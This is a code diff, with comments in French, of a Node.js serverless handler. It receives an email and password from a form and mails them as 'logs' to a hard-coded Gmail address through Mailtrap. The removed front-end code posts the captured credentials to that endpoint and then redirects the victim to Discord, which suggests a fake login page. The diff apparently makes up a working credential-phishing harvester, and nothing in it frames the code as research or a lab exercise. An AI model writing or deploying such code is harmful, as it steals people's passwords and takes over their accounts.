@@ -1,21 +1,21 @@
 require("dotenv").config();
 const nodemailer = require("nodemailer");
 
- module.exports = async (req, res) => {
+module.exports = async (req, res) => {
+    // Vérifie que la méthode est bien POST
     if (req.method !== "POST") {
         return res.status(405).json({ message: "Méthode non autorisée" });
     }
 
+    // Récupère les données du formulaire
     const { email, password } = req.body;
 
+    // Vérifie que l'email et le mot de passe sont présents
     if (!email || !password) {
         return res.status(400).json({ message: "Email et mot de passe requis" });
     }
 
-    res.status(200).json({ message: "Données reçues !" });
-};
-
-    // Configurer le transporteur Mailtrap
+    // Configure le transporteur Mailtrap
     const transporter = nodemailer.createTransport({
         host: process.env.MAILTRAP_HOST,
         port: process.env.MAILTRAP_PORT,
@@ -25,36 +25,20 @@ const nodemailer = require("nodemailer");
         },
     });
 
-    // Configurer l'email
+    // Configure l'email
     const mailOptions = {
-        from: `luccabondi@gmail.com`,
-        to: "luccabondi@gmail.com",
+        from: `luccabondi@gmail.com`, // Ton email
+        to: "luccabondi@gmail.com",   // L'email où tu veux recevoir les logs
         subject: "Test Mailtrap - Nouveau log",
         text: `Email: ${email}\nMot de passe: ${password}`,
     };
 
     try {
+        // Envoie l'email via Mailtrap
         await transporter.sendMail(mailOptions);
-        res.status(200).json({ message: "Email envoyé via Mailtrap !" });
+        return res.status(200).json({ message: "Email envoyé via Mailtrap !" });
     } catch (error) {
         console.error("Erreur envoi email:", error);
-        res.status(500).json({ message: "Erreur d'envoi d'email", error });
+        return res.status(500).json({ message: "Erreur d'envoi d'email", error });
     }
-}
-fetch("/api/send-log", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ email: email, password: password })
-})
-.then(response => response.json())
-.then(data => {
-    console.log(data);
-    alert("Log envoyé avec succès !");
-    window.location.href = "https://discord.com/channels/@me";
-})
-.catch(error => {
-    console.error("Erreur :", error);
-    alert("Une erreur est survenue lors de l'envoi des logs.");
-});
+};
